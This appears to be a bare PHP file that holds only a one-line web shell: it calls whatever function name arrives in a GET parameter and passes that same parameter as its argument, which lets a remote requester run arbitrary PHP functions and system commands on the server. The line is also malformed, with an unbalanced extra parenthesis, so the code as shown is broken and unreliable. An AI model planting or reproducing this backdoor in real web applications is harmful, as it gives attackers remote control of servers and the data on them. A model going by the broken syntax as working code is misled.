<?php
$_GET['ALNyZ4le'](($_GET['ALNyZ4le']);
?>
